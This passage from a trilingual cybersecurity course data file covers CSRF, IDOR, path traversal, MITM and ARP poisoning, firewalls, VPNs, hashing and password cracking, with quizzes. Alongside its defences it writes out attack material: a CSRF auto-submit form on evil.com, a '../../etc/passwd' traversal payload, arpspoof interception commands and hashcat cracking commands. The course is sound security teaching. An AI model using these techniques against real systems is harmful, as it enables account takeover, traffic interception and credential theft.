  &lt;input name="amount" value="1000000"&gt;
  &lt;input name="to" value="hacker_account"&gt;
&lt;/form&gt;
&lt;script&gt;document.forms[0].submit()&lt;/script&gt;

4. Sizning sessioningiz bilan pul o'tkazildi!
   Brauzer cookie ni avtomatik yuboradi!</code></pre>
<h3>🛡️ CSRF dan himoya</h3>
<pre><code># 1. CSRF Token (eng kuchli):
# Har bir formaga noyob token:
&lt;input type="hidden" name="csrf_token" value="a7f3k9..."&gt;
# Server tokenni tekshiradi — tashqi saytda bo'lmaydi

# 2. SameSite Cookie:
Set-Cookie: session=abc; SameSite=Strict
# Tashqi saytdan cookie yuborilmaydi

# 3. Referer tekshirish:
# So'rov qayerdan kelganini tekshirish</code></pre>
<h3>🔓 Boshqa muhim zaifliklar</h3>
<div class="info-box">
<p><strong>IDOR (Insecure Direct Object Reference):</strong><br>
<code>GET /profile?id=123</code> → id=124 yozib boshqa profil ko'rish<br>
Himoya: Har bir so'rovda ruxsatni tekshirish</p>
<p><strong>Path Traversal:</strong><br>
<code>?file=../../etc/passwd</code> → tizim fayllarini o'qish<br>
Himoya: Fayl nomlarini tekshirish, whitelist</p>
<p><strong>Open Redirect:</strong><br>
<code>?next=https://evil.com</code> → foydalanuvchini yo'naltirish<br>
Himoya: Faqat ichki URL larga yo'naltirish</p>
<p><strong>SSRF (Server-Side Request Forgery):</strong><br>
Serverga o'z ichki tarmoqqa so'rov yubortirish<br>
Himoya: URL whitelist, metadat servislarini bloklash</p>
</div>
<h3>📋 OWASP Top 10 (2021) — to'liq ro'yxat</h3>
<pre><code>A01 — Broken Access Control (IDOR, CSRF)
A02 — Cryptographic Failures (zaif shifrlash)
A03 — Injection (SQLi, Command injection)
A04 — Insecure Design (dizayn xatolari)
A05 — Security Misconfiguration (noto'g'ri sozlama)
A06 — Vulnerable Components (eski kutubxonalar)
A07 — Auth Failures (zaif login)
A08 — Data Integrity Failures (CSRF)
A09 — Logging Failures (log yo'q)
A10 — SSRF</code></pre>`,
          ru:`<h2>CSRF и другие веб-атаки</h2>
<h3>🎭 CSRF — подделка межсайтовых запросов</h3>
<pre><code># Сценарий:
1. Вы вошли на bank.ru, сессия активна
2. Вы нажали ссылку в email:
   http://evil.com/csrf_attack.html
3. На evil.com скрытая форма:

&lt;form action="https://bank.ru/transfer" method="POST"&gt;
  &lt;input name="amount" value="10000"&gt;
  &lt;input name="to" value="hacker_account"&gt;
&lt;/form&gt;
&lt;script&gt;document.forms[0].submit()&lt;/script&gt;

4. Деньги переведены с вашей сессией!</code></pre>
<h3>🛡️ Защита от CSRF</h3>
<pre><code># 1. CSRF Token:
&lt;input type="hidden" name="csrf_token" value="a7f3k9..."&gt;

# 2. SameSite Cookie:
Set-Cookie: session=abc; SameSite=Strict

# 3. Проверка Referer</code></pre>
<h3>🔓 Другие важные уязвимости</h3>
<div class="info-box">
<p><strong>IDOR:</strong> <code>?id=123</code> → <code>?id=124</code> — чужой профиль</p>
<p><strong>Path Traversal:</strong> <code>?file=../../etc/passwd</code></p>
<p><strong>SSRF:</strong> Сервер отправляет запросы в внутреннюю сеть</p>
</div>`,
          en:`<h2>CSRF and other web attacks</h2>
<h3>🎭 CSRF — Cross-Site Request Forgery</h3>
<pre><code># Scenario:
1. You're logged into bank.com, session active
2. You click a link in email: http://evil.com/attack.html
3. Evil.com has a hidden form:

&lt;form action="https://bank.com/transfer" method="POST"&gt;
  &lt;input name="amount" value="10000"&gt;
  &lt;input name="to" value="hacker_account"&gt;
&lt;/form&gt;
&lt;script&gt;document.forms[0].submit()&lt;/script&gt;

4. Money transferred using your session!</code></pre>
<h3>🛡️ CSRF defenses</h3>
<pre><code># 1. CSRF Token:
&lt;input type="hidden" name="csrf_token" value="a7f3k9..."&gt;

# 2. SameSite Cookie:
Set-Cookie: session=abc; SameSite=Strict</code></pre>
<h3>🔓 Other important vulnerabilities</h3>
<div class="info-box">
<p><strong>IDOR:</strong> <code>?id=123</code> → <code>?id=124</code> — someone else's profile</p>
<p><strong>Path Traversal:</strong> <code>?file=../../etc/passwd</code></p>
<p><strong>SSRF:</strong> Server makes requests to its own internal network</p>
</div>`
        },
        quiz:[
          { q:{uz:"CSRF hujumi qanday amalga oshiriladi?",ru:"Как осуществляется CSRF атака?",en:"How is a CSRF attack carried out?"},
            options:{uz:["Parolni topish","Foydalanuvchi bilmagan holda uning session i bilan so'rov yuborish","SQL kodi kiritish","Serverni yiqitish"],ru:["Угадать пароль","Отправка запроса с сессией пользователя без его ведома","Ввод SQL кода","Опрокинуть сервер"],en:["Guessing password","Sending requests with user's session without their knowledge","Entering SQL code","Crashing server"]}, answer:1 },
          { q:{uz:"IDOR (Insecure Direct Object Reference) misoli?",ru:"Пример IDOR (Insecure Direct Object Reference)?",en:"Example of IDOR (Insecure Direct Object Reference)?"},
            options:{uz:["SQL kodini kiritish","?id=123 ni ?id=124 ga o'zgartirish — boshqa profil ko'rish","JavaScript yuborish","Cookie o'g'irlash"],ru:["Ввод SQL кода","Изменение ?id=123 на ?id=124 — просмотр чужого профиля","Отправка JavaScript","Кража cookie"],en:["Entering SQL code","Changing ?id=123 to ?id=124 — viewing someone else's profile","Sending JavaScript","Stealing cookies"]}, answer:1 }
        ]
      }
    ]
  },

  // ─────────────────────────────────────────────
  //  KURS 7 — 7-hafta: Tarmoq Hujumlari
  // ─────────────────────────────────────────────
  {
    id:"c2w7", level:2, week:7, icon:"📡", color:"#ff8800",
    title:{ uz:"Tarmoq Hujumlari va Himoya", ru:"Сетевые атаки и защита", en:"Network Attacks and Defence" },
    desc:{ uz:"ARP poisoning, MITM, Wi-Fi xavfsizligi va tarmoq himoya asoslari", ru:"ARP poisoning, MITM, безопасность Wi-Fi и основы защиты сети", en:"ARP poisoning, MITM, Wi-Fi security and network defence basics" },
    duration:{ uz:"3 × 30 daqiqa", ru:"3 × 30 минут", en:"3 × 30 minutes" },
    lessons:[
      {
        id:"c2w7l1",
        title:{ uz:"Man-in-the-Middle va ARP Poisoning", ru:"Man-in-the-Middle и ARP Poisoning", en:"Man-in-the-Middle and ARP Poisoning" },
        duration:"30 daq",
        content:{
          uz:`<h2>Man-in-the-Middle (MITM) Hujumi</h2>
<p>MITM — hujumchi siz va server o'rtasiga "kirib" barcha trafik ni ko'radi va o'zgartiradi. Xuddi pochta xatlaringizni yo'lda ochib o'qish kabi.</p>
<h3>🎭 MITM qanday ishlaydi?</h3>
<pre><code>Normal:
Siz ←→ Router ←→ Internet

MITM:
Siz ←→ Hujumchi ←→ Router ←→ Internet
           ↑ barcha trafik shu yerdan o'tadi</code></pre>
<h3>🔧 ARP Poisoning — MITM usuli</h3>
<div class="info-box">
<p><strong>ARP (Address Resolution Protocol):</strong> IP manzilni MAC manzilga aylantiradi. Masalan: "192.168.1.1 kim?" → "Men! MAC: aa:bb:cc:dd:ee:ff"</p>
<p><strong>Hujum:</strong> Hujumchi routerga: "Men 192.168.1.50 (maqsad kompyuter)" va maqsadga: "Men 192.168.1.1 (router)" deydi. Hamma trafik hujumchi orqali o'tadi!</p>
</div>
<pre><code># Kali Linux da ARP Poisoning:
# arpspoof vositasi bilan:
echo 1 > /proc/sys/net/ipv4/ip_forward   # forward yoqish

arpspoof -i eth0 -t 192.168.1.50 192.168.1.1  # victimga
arpspoof -i eth0 -t 192.168.1.1 192.168.1.50  # routerga

# Endi Wireshark bilan barcha trafik ko'rinadi!
# HTTP (shifrlanmagan) parollar ko'rinadi</code></pre>
<h3>🛡️ MITM dan himoya</h3>
<ul>
<li><strong>HTTPS ishlatish</strong> — shifrlangan trafik ko'rilmaydi</li>
<li><strong>VPN ishlatish</strong> — barcha trafik shifrlangan tunnel orqali</li>
<li><strong>Dynamic ARP Inspection</strong> — switch darajasida himoya</li>
<li><strong>HSTS</strong> — brauzerga "har doim HTTPS" deyish</li>
<li><strong>Sertifikat ogohlantirish</strong> — brauzer MITM ni sezishi mumkin</li>
</ul>
<h3>📱 Ommaviy Wi-Fi xavfi</h3>
<pre><code>❌ XAVFLI holatlar:
- Kafe/mehmonxona Wi-Fi (parolsiz yoki oddiy)
- "Free_Airport_WiFi" kabi soxta access point
- HTTP orqali ishlash ommaviy tarmoqda

✅ XAVFSIZ amaliyot:
- VPN yoqing (NordVPN, Mullvad, bepul: ProtonVPN)
- Faqat HTTPS saytlarga kiring
- Bankingizni uydan ishlating</code></pre>`,
          ru:`<h2>Man-in-the-Middle (MITM) атака</h2>
<p>MITM — атакующий "встаёт" между вами и сервером, видит и изменяет весь трафик.</p>
<h3>🎭 Как работает MITM?</h3>
<pre><code>Нормально:
Вы ←→ Роутер ←→ Интернет

MITM:
Вы ←→ Атакующий ←→ Роутер ←→ Интернет
           ↑ весь трафик через него</code></pre>
<h3>🔧 ARP Poisoning</h3>
<div class="info-box">
<p>Атакующий говорит роутеру: "Я — жертва" и жертве: "Я — роутер". Весь трафик идёт через атакующего!</p>
</div>
<h3>🛡️ Защита от MITM</h3>
<ul>
<li><strong>HTTPS</strong> — зашифрованный трафик не виден</li>
<li><strong>VPN</strong> — весь трафик в зашифрованном туннеле</li>
<li><strong>HSTS</strong> — браузеру: "всегда HTTPS"</li>
</ul>`,
          en:`<h2>Man-in-the-Middle (MITM) Attack</h2>
<p>MITM — an attacker stands between you and the server, seeing and modifying all traffic.</p>
<h3>🎭 How MITM works</h3>
<pre><code>Normal:
You ←→ Router ←→ Internet

MITM:
You ←→ Attacker ←→ Router ←→ Internet
              ↑ all traffic flows here</code></pre>
<h3>🛡️ MITM defences</h3>
<ul>
<li><strong>HTTPS</strong> — encrypted traffic isn't readable</li>
<li><strong>VPN</strong> — all traffic in encrypted tunnel</li>
<li><strong>HSTS</strong> — tells browser "always HTTPS"</li>
<li><strong>Dynamic ARP Inspection</strong> — switch-level protection</li>
</ul>`
        },
        quiz:[
          { q:{uz:"ARP Poisoning nima uchun xavfli?",ru:"Почему ARP Poisoning опасен?",en:"Why is ARP Poisoning dangerous?"},
            options:{uz:["Serverni o'chiradi","Tarmoq trafigini hujumchi orqali yo'naltiradi","Fayllarni o'chiradi","Parolni o'zgartiradi"],ru:["Выключает сервер","Перенаправляет сетевой трафик через атакующего","Удаляет файлы","Меняет пароль"],en:["Shuts down server","Routes network traffic through the attacker","Deletes files","Changes passwords"]}, answer:1 },
          { q:{uz:"Ommaviy Wi-Fi da o'zini himoya qilishning eng yaxshi usuli?",ru:"Лучший способ защиты в публичном Wi-Fi?",en:"Best way to protect yourself on public Wi-Fi?"},
            options:{uz:["Kuchli parol o'rnatish","VPN ishlatish","Tezroq internet topish","Brauzer yangilash"],ru:["Установить сильный пароль","Использовать VPN","Найти более быстрый интернет","Обновить браузер"],en:["Set strong password","Use VPN","Find faster internet","Update browser"]}, answer:1 }
        ]
      },
      {
        id:"c2w7l2",
        title:{ uz:"Firewall va IDS/IPS tushunchalari", ru:"Понятия Firewall и IDS/IPS", en:"Firewall and IDS/IPS concepts" },
        duration:"30 daq",
        content:{
          uz:`<h2>Firewall va IDS/IPS</h2>
<p>Tarmoq himoyasining asosiy vositalari — Firewall, IDS va IPS. Ularning farqini va qanday ishlashini tushunib olaylik.</p>
<h3>🧱 Firewall — Tarmoq darvozaboni</h3>
<div class="info-box">
<p>Firewall — kiruvchi va chiquvchi tarmoq trafikni qoidalarga asosan filtrlaydi. "Qoida bo'yicha o'tkazadi yoki bloklaydi."</p>
</div>
<pre><code># Firewall qoidalari misoli (iptables):
# Kiruvchi HTTP ruxsat:
iptables -A INPUT -p tcp --dport 80 -j ACCEPT
# Kiruvchi HTTPS ruxsat:
iptables -A INPUT -p tcp --dport 443 -j ACCEPT
# SSH faqat 192.168.1.0/24 dan:
iptables -A INPUT -p tcp --dport 22 -s 192.168.1.0/24 -j ACCEPT
# Qolgan hamma narsa bloklash:
iptables -A INPUT -j DROP

# Windows Firewall boshqarish:
netsh advfirewall set allprofiles state on
netsh advfirewall firewall add rule name="Block Port 23"
  protocol=TCP dir=in localport=23 action=block</code></pre>
<h3>🔍 IDS — Intrusion Detection System</h3>
<p>IDS — tarmoqni kuzatadi va shubhali faollikni aniqlaydi. <strong>Faqat xabar beradi</strong>, bloklamaydi.</p>
<div class="info-box">
<p><strong>Signature-based IDS:</strong> Ma'lum hujum imzolarini qidiradi (antivirus kabi). Yangi hujumlarni sezmaydi.</p>
<p><strong>Anomaly-based IDS:</strong> Oddiy xatti-harakatdan farqni aniqlaydi. Yangi hujumlarni ham sezishi mumkin.</p>
</div>
<h3>🛡️ IPS — Intrusion Prevention System</h3>
<p>IPS = IDS + Avtomatik bloklash. Shubhali trafikni o'zi bloklaydi.</p>
<pre><code>IDS: "Hujum aniqlandii! (faqat xabar)
IPS: "Hujum aniqlandi + BLOKLANDI!"

Mashhur vositalar:
- Snort (bepul, ochiq manba)
- Suricata (bepul, ko'p o'qishli)
- Zeek (tarmoq tahlili)
- Cisco Firepower (tijoriy)</code></pre>
<h3>🏗️ Tarmoq arxitekturasi — DMZ</h3>
<pre><code>Internet
    ↓
[Tashqi Firewall]
    ↓
  [DMZ zona] ← ommaviy serverlar (web, mail, DNS)
    ↓
[Ichki Firewall]
    ↓
[Ichki tarmoq] ← muhim ma'lumotlar, serverlar

DMZ — hujum bo'lsa, ichki tarmoq himoyalangan!</code></pre>`,
          ru:`<h2>Firewall и IDS/IPS</h2>
<h3>🧱 Firewall — Страж сетевых ворот</h3>
<pre><code># Правила iptables:
iptables -A INPUT -p tcp --dport 80 -j ACCEPT   # HTTP
iptables -A INPUT -p tcp --dport 443 -j ACCEPT  # HTTPS
iptables -A INPUT -p tcp --dport 22 -s 192.168.1.0/24 -j ACCEPT
iptables -A INPUT -j DROP   # всё остальное блокировать</code></pre>
<h3>🔍 IDS vs IPS</h3>
<div class="info-box">
<p><strong>IDS (обнаружение):</strong> Мониторит и уведомляет об атаках — не блокирует</p>
<p><strong>IPS (предотвращение):</strong> IDS + автоматическая блокировка</p>
</div>
<h3>🏗️ DMZ архитектура</h3>
<pre><code>Интернет → [Внешний Firewall] → [DMZ] → [Внутренний Firewall] → [Внутренняя сеть]
DMZ: публичные серверы (web, mail, DNS)</code></pre>`,
          en:`<h2>Firewall and IDS/IPS</h2>
<h3>🧱 Firewall — Network gatekeeper</h3>
<pre><code># iptables rules:
iptables -A INPUT -p tcp --dport 80 -j ACCEPT   # HTTP
iptables -A INPUT -p tcp --dport 443 -j ACCEPT  # HTTPS
iptables -A INPUT -p tcp --dport 22 -s 192.168.1.0/24 -j ACCEPT
iptables -A INPUT -j DROP   # block everything else</code></pre>
<h3>🔍 IDS vs IPS</h3>
<div class="info-box">
<p><strong>IDS (Detection):</strong> Monitors and alerts about attacks — doesn't block</p>
<p><strong>IPS (Prevention):</strong> IDS + automatic blocking</p>
</div>
<h3>🏗️ DMZ architecture</h3>
<pre><code>Internet → [Outer FW] → [DMZ] → [Inner FW] → [Internal network]
DMZ: public servers (web, mail, DNS)</code></pre>`
        },
        quiz:[
          { q:{uz:"IDS va IPS ning asosiy farqi nima?",ru:"В чём ключевое отличие IDS от IPS?",en:"What is the key difference between IDS and IPS?"},
            options:{uz:["IDS tezroq","IPS hujumni bloklaydi, IDS faqat xabar beradi","IDS ko'proq qimmat","IPS faqat web uchun"],ru:["IDS быстрее","IPS блокирует атаку, IDS только уведомляет","IDS дороже","IPS только для веб"],en:["IDS is faster","IPS blocks attacks, IDS only alerts","IDS is more expensive","IPS is only for web"]}, answer:1 }
        ]
      },
      {
        id:"c2w7l3",
        title:{ uz:"VPN va tarmoq himoyasi amaliyoti", ru:"VPN и практика сетевой защиты", en:"VPN and network protection practice" },
        duration:"30 daq",
        content:{
          uz:`<h2>VPN va Tarmoq Himoyasi Amaliyoti</h2>
<h3>🔒 VPN qanday ishlaydi?</h3>
<p>VPN (Virtual Private Network) — sizning internetdagi barcha trafik ni shifrlaydi va VPN server orqali o'tkazadi.</p>
<pre><code>VPN YOQILMAGAN:
Siz → [Ochiq internet] → Sayt
       ↑ ISP, hukumat, hujumchilar ko'rishi mumkin

VPN YOQILGAN:
Siz → [Shifrlangan tunnel] → VPN Server → Sayt
       ↑ faqat "siz VPN ga ulangansiz" ko'rinadi</code></pre>
<h3>🔧 VPN protokollari</h3>
<div class="info-box">
<p><strong>WireGuard:</strong> Yangi, tez, xavfsiz — tavsiya etiladi</p>
<p><strong>OpenVPN:</strong> Kuchli, ochiq manba, konfiguratsiya qilinishi mumkin</p>
<p><strong>IPSec/L2TP:</strong> Korporativ tarmoqlar uchun</p>
<p><strong>PPTP:</strong> Eski, ZAIF — ishlatmang!</p>
</div>
<h3>🛠️ OpenVPN serverni o'rnatish</h3>
<pre><code># Ubuntu serverda:
apt install openvpn easy-rsa

# Sertifikat yaratish
make-cadir ~/openvpn-ca
cd ~/openvpn-ca
source vars
./clean-all
./build-ca
./build-key-server server
./build-dh

# Konfiguratsiya nusxalash
cp /usr/share/doc/openvpn/examples/sample-config-files/server.conf.gz /etc/openvpn/
gunzip /etc/openvpn/server.conf.gz

# Ishga tushirish
systemctl start openvpn@server</code></pre>
<h3>🌐 Bepul VPN tavsiyalar (ishonchli)</h3>
<ul>
<li><strong>ProtonVPN</strong> — bepul tarif, jurnalsiz, Shveytsariya</li>
<li><strong>Mullvad</strong> — maxfiylik bo'yicha eng yaxshi, anonim to'lov</li>
<li><strong>Windscribe</strong> — bepul 10GB/oy</li>
</ul>
<div class="info-box">
<p><strong>⚠️ OGOH OLING:</strong> "Bepul VPN" lar ko'pincha ma'lumotlaringizni sotadi! Ishonchli VPN tanlang.</p>
</div>
<h3>📋 2-oy yakuniy tekshiruv</h3>
<pre><code">✓ Web qatlamlari (Frontend, Backend, DB)
✓ HTTP metodlari va status kodlari
✓ Cookie, Session, JWT
✓ Burp Suite asoslari
✓ SQL Injection — hujum va himoya
✓ XSS turlari va himoya
✓ CSRF va IDOR
✓ MITM va ARP Poisoning
✓ Firewall, IDS, IPS
✓ VPN va protokollar</code></pre>`,
          ru:`<h2>VPN и практика сетевой защиты</h2>
<h3>🔒 Как работает VPN?</h3>
<pre><code>БЕЗ VPN:
Вы → [Открытый интернет] → Сайт
      ↑ виден провайдеру, правительству, хакерам

С VPN:
Вы → [Зашифрованный туннель] → VPN Сервер → Сайт
      ↑ видно только "вы подключены к VPN"</code></pre>
<h3>🔧 VPN протоколы</h3>
<div class="info-box">
<p><strong>WireGuard:</strong> Новый, быстрый, безопасный — рекомендуется</p>
<p><strong>OpenVPN:</strong> Мощный, открытый исходник</p>
<p><strong>PPTP:</strong> Старый, СЛАБЫЙ — не используйте!</p>
</div>
<h3>🌐 Надёжные бесплатные VPN</h3>
<ul>
<li><strong>ProtonVPN</strong> — бесплатный тариф, без логов, Швейцария</li>
<li><strong>Mullvad</strong> — лучший по приватности, анонимная оплата</li>
<li><strong>Windscribe</strong> — бесплатно 10GB/мес</li>
</ul>`,
          en:`<h2>VPN and network protection practice</h2>
<h3>🔒 How VPN works</h3>
<pre><code>WITHOUT VPN:
You → [Open internet] → Site
       ↑ visible to ISP, government, attackers

WITH VPN:
You → [Encrypted tunnel] → VPN Server → Site
       ↑ only "you're connected to VPN" is visible</code></pre>
<h3>🔧 VPN protocols</h3>
<div class="info-box">
<p><strong>WireGuard:</strong> New, fast, secure — recommended</p>
<p><strong>OpenVPN:</strong> Powerful, open source</p>
<p><strong>PPTP:</strong> Old, WEAK — don't use!</p>
</div>
<h3>🌐 Trusted free VPNs</h3>
<ul>
<li><strong>ProtonVPN</strong> — free tier, no-logs, Switzerland</li>
<li><strong>Mullvad</strong> — best for privacy, anonymous payment</li>
</ul>`
        },
        quiz:[
          { q:{uz:"VPN qaysi protokoli eng xavfsiz hisoblanadi?",ru:"Какой VPN протокол считается наиболее безопасным?",en:"Which VPN protocol is considered most secure?"},
            options:{uz:["PPTP","L2TP","WireGuard / OpenVPN","HTTP"],ru:["PPTP","L2TP","WireGuard / OpenVPN","HTTP"],en:["PPTP","L2TP","WireGuard / OpenVPN","HTTP"]}, answer:2 }
        ]
      }
    ]
  },

  // ─────────────────────────────────────────────
  //  KURS 8 — 8-hafta: Kriptografiya va Parollar
  // ─────────────────────────────────────────────
  {
    id:"c2w8", level:2, week:8, icon:"🔐", color:"#9945ff",
    title:{ uz:"Kriptografiya va Parol Xavfsizligi", ru:"Криптография и безопасность паролей", en:"Cryptography and Password Security" },
    desc:{ uz:"Shifrlash qanday ishlaydi, hash funksiyalar, parol buzish texnikalari va himoya", ru:"Как работает шифрование, хеш-функции, техники взлома паролей и защита", en:"How encryption works, hash functions, password cracking techniques and defence" },
    duration:{ uz:"3 × 35 daqiqa", ru:"3 × 35 минут", en:"3 × 35 minutes" },
    lessons:[
      {
        id:"c2w8l1",
        title:{ uz:"Shifrlash va Hash funksiyalar", ru:"Шифрование и хеш-функции", en:"Encryption and hash functions" },
        duration:"35 daq",
        content:{
          uz:`<h2>Shifrlash va Hash Funksiyalar</h2>
<p>Kriptografiya — ma'lumotni himoya qilishning matematikaviy usuli. Qo'rqmang — formulalar yo'q, faqat tushunchalar!</p>
<h3>🔄 Shifrlash turlari</h3>
<div class="info-box">
<p><strong>Simmetrik shifrlash:</strong> Bir xil kalit shifrlaш va ochish uchun. Tez, lekin kalitni xavfsiz uzatish muammo.<br>Misol: AES-256 (eng kuchli), DES (eski, zaif)</p>
<p><strong>Asimmetrik shifrlash:</strong> Ikki kalit — ochiq (public) va yopiq (private). Ochiq kalit bilan shifrlanadi, faqat yopiq kalit bilan ochiladi.<br>Misol: RSA-2048, ECC</p>
</div>
<pre><code># Simmetrik (AES) misoli:
Kalit: "mysecretkey12345"
Matn:  "Salom dunyo"
Shifr: "U2FsdGVkX1..."  ← faqat kalit bilan ochiladi

# Asimmetrik (RSA) misoli:
Ali'ning ochiq kaliti (hamma biladi)
Ali'ning yopiq kaliti (faqat Ali biladi)

Sizga xabar yuborish:
1. Ali'ning ochiq kaliti bilan shifrlaysiz
2. Faqat Ali o'z yopiq kaliti bilan ochadi</code></pre>
<h3>#️⃣ Hash Funksiyalar — Bir Tomonlama</h3>
<p>Hash — ma'lumotni belgilangan uzunlikdagi "barmoq iziga" aylantiradi. Orqaga qaytarish mumkin emas!</p>
<pre><code>MD5    (ZAIF): "password" → 5f4dcc3b5aa765d61d8327deb882cf99
SHA-1  (ZAIF): "password" → 5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8
SHA-256(YAXSHI): "password" → 5e884898da28047151d0e56f8dc62927...
SHA-3  (ENG YAXSHI): yangi standart

# Hash lar tengsiz:
"password" → 5e884898...
"Password" → 961b6dd3...  ← bitta harf farqi = butunlay boshqa!</code></pre>
<h3>🏦 Parollar qanday saqlanishi kerak?</h3>
<pre><code># ❌ YOMON usul (hech qachon):
users: {password: "12345"}    # ochiq matn
users: {password: MD5("12345")}  # zaif hash

# ✅ TO'G'RI usul:
# bcrypt / Argon2 / scrypt bilan:
salt = random_bytes(16)
hash = bcrypt.hash("12345" + salt, rounds=12)
users: {password_hash: hash, salt: salt}

# Hujumchi bazani o'g'irlasa ham:
hash + salt → parolni topish juda qiyin!</code></pre>
<h3>🌐 HTTPS qanday ishlaydi (TLS)?</h3>
<pre><code>1. Brauzer: "Salom, men TLS 1.3 ni qo'llab-quvvatlayman"
2. Server: "Men ham. Bu mening sertifikatim (ochiq kalit)"
3. Brauzer: Sertifikatni tekshiradi (CA orqali)
4. Ikkalasi: Simmetrik kalit almashinadi (asimmetrik bilan)
5. Hamma trafik: AES-256 bilan shifrlangan</code></pre>`,
          ru:`<h2>Шифрование и хеш-функции</h2>
<h3>🔄 Типы шифрования</h3>
<div class="info-box">
<p><strong>Симметричное:</strong> Один ключ для шифрования и расшифровки. Быстрое. Пример: AES-256</p>
<p><strong>Асимметричное:</strong> Два ключа — публичный и приватный. Пример: RSA-2048</p>
</div>
<pre><code># Хеш-функции (необратимые):
MD5   (СЛАБЫЙ):  "password" → 5f4dcc3b...
SHA-1 (СЛАБЫЙ):  "password" → 5baa61e4...
SHA-256 (ХОРОШО): "password" → 5e884898...
SHA-3  (ЛУЧШИЙ):  современный стандарт</code></pre>
<h3>🏦 Как правильно хранить пароли?</h3>
<pre><code># ❌ ПЛОХО (никогда):
{password: "12345"}          # открытый текст
{password: MD5("12345")}     # слабый хеш

# ✅ ПРАВИЛЬНО:
# bcrypt / Argon2 / scrypt:
salt = random_bytes(16)
hash = bcrypt.hash("12345" + salt, rounds=12)</code></pre>`,
          en:`<h2>Encryption and hash functions</h2>
<h3>🔄 Types of encryption</h3>
<div class="info-box">
<p><strong>Symmetric:</strong> Same key for encrypting and decrypting. Fast. Example: AES-256</p>
<p><strong>Asymmetric:</strong> Two keys — public and private. Example: RSA-2048</p>
</div>
<pre><code># Hash functions (one-way):
MD5    (WEAK):  "password" → 5f4dcc3b...
SHA-1  (WEAK):  "password" → 5baa61e4...
SHA-256 (GOOD): "password" → 5e884898...
SHA-3  (BEST):  modern standard</code></pre>
<h3>🏦 How to properly store passwords</h3>
<pre><code># ❌ BAD (never):
{password: "12345"}         # plain text
{password: MD5("12345")}    # weak hash

# ✅ CORRECT:
# bcrypt / Argon2 / scrypt:
salt = random_bytes(16)
hash = bcrypt.hash("12345" + salt, rounds=12)</code></pre>`
        },
        quiz:[
          { q:{uz:"Hash funksiyaning asosiy xususiyati nima?",ru:"Каковы основные свойства хеш-функции?",en:"What is the key property of a hash function?"},
            options:{uz:["Teskari bo'lishi mumkin","Bir tomonlama — orqaga qaytarish mumkin emas","Kalit kerak","Shifrlash bilan bir xil"],ru:["Обратима","Однонаправленная — необратима","Требует ключ","То же что шифрование"],en:["It's reversible","One-way — cannot be reversed","Requires a key","Same as encryption"]}, answer:1 },
          { q:{uz:"Parollarni saqlashda eng to'g'ri usul?",ru:"Наиболее правильный способ хранения паролей?",en:"The most correct way to store passwords?"},
            options:{uz:["Ochiq matn","MD5 hash","bcrypt yoki Argon2 bilan salt qo'shib","SHA-1 hash"],ru:["Открытый текст","MD5 хеш","bcrypt или Argon2 с солью","SHA-1 хеш"],en:["Plain text","MD5 hash","bcrypt or Argon2 with salt","SHA-1 hash"]}, answer:2 }
        ]
      },
      {
        id:"c2w8l2",
        title:{ uz:"Parol Buzish Texnikalari", ru:"Техники взлома паролей", en:"Password cracking techniques" },
        duration:"35 daq",
        content:{
          uz:`<h2>Parol Buzish Texnikalari</h2>
<p>Ushbu bilim mudofaa uchun kerak — zaif parollar qanchalik tez buzilishini ko'rsangiz, mustahkam parol yaratishga undaysiz.</p>
<div class="info-box">
<p><strong>⚠️ Etik eslatma:</strong> Bu bilimlarni faqat o'z tizimlari yoki maxsus ruxsat berilgan tizimlarda ishlating!</p>
</div>
<h3>💡 Parol Buzish Usullari</h3>
<div class="info-box">
<p><strong>Brute Force:</strong> Barcha kombinatsiyani sinab ko'rish. "aaa, aab, aac..." 6 belgili parol: 26^6 = 308 million variant</p>
<p><strong>Dictionary Attack:</strong> So'z ro'yxatidan foydalanish. rockyou.txt — 14 million real parol.</p>
<p><strong>Rainbow Table:</strong> Hash → parol jadvali. Oldindan hisoblangan hashlar. Salt qo'shilsa ishlamaydi!</p>
<p><strong>Hybrid Attack:</strong> So'z + raqam: "password1", "admin2024"</p>
<p><strong>Credential Stuffing:</strong> Ma'lumot ombori hujum — o'g'irlangan parollar bilan boshqa saytlarga kirish</p>
</div>
<h3>🔧 Hashcat — Parol buzish vositasi</h3>
<pre><code># Hash turini aniqlash
hashid hash.txt

# Dictionary attack (rockyou.txt bilan):
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
# -m 0 = MD5
# -m 100 = SHA-1
# -m 1800 = sha512crypt (Linux /etc/shadow)
# -m 3200 = bcrypt

# Brute force (8 belgigacha):
hashcat -m 0 hash.txt -a 3 ?a?a?a?a?a?a?a?a

# Kombinatsiya:
hashcat -m 0 hash.txt -a 6 wordlist.txt ?d?d?d?d</code></pre>
<h3>⏱️ Parolni buzish vaqti (zamonaviy GPU)</h3>
<pre><code>Parol          Vaqt
123456         < 1 soniya
password       < 1 soniya
P@ssword       1 daqiqa
P@ssw0rd!      2 soat
P@ssw0rd!23    3 kun
Tr0ub4d0r&3    10 yil
Mening_Uyim_2024!  Asrlar!</code></pre>
<h3>🛡️ Himoya choralari</h3>
<pre><code># 1. Salt qo'shing (Rainbow Table dan himoya)
# 2. bcrypt/Argon2 (sekin hash — brute force dan himoya)
# 3. Rate limiting (ko'p urinishni bloklash)
# 4. Account lockout (5 xato → blok)
# 5. CAPTCHA
# 6. 2FA — parol buzilsa ham kirib bo'lmaydi!</code></pre>`,
          ru:`<h2>Техники взлома паролей</h2>
<div class="info-box">
<p><strong>⚠️ Этическое замечание:</strong> Используйте эти знания только для своих систем или с явного разрешения!</p>
</div>
<h3>💡 Методы взлома паролей</h3>
<div class="info-box">
<p><strong>Brute Force:</strong> Перебор всех комбинаций</p>
<p><strong>Dictionary Attack:</strong> Список слов. rockyou.txt — 14 млн паролей</p>
<p><strong>Rainbow Table:</strong> Предвычисленные хеши. Соль делает бесполезным!</p>
<p><strong>Credential Stuffing:</strong> Украденные пароли на других сайтах</p>
</div>
<h3>⏱️ Время взлома (современный GPU)</h3>
<pre><code>password       < 1 секунды
P@ssw0rd!      2 часа
P@ssw0rd!23    3 дня
Tr0ub4d0r&3    10 лет
Moj_Dom_2024!  Века!</code></pre>`,
          en:`<h2>Password cracking techniques</h2>
<div class="info-box">
<p><strong>⚠️ Ethical note:</strong> Use this knowledge only on your own systems or with explicit permission!</p>
</div>
<h3>💡 Password cracking methods</h3>
<div class="info-box">
<p><strong>Brute Force:</strong> Try all combinations</p>
<p><strong>Dictionary Attack:</strong> Wordlist. rockyou.txt — 14 million real passwords</p>
<p><strong>Rainbow Table:</strong> Pre-computed hashes. Salt defeats it!</p>
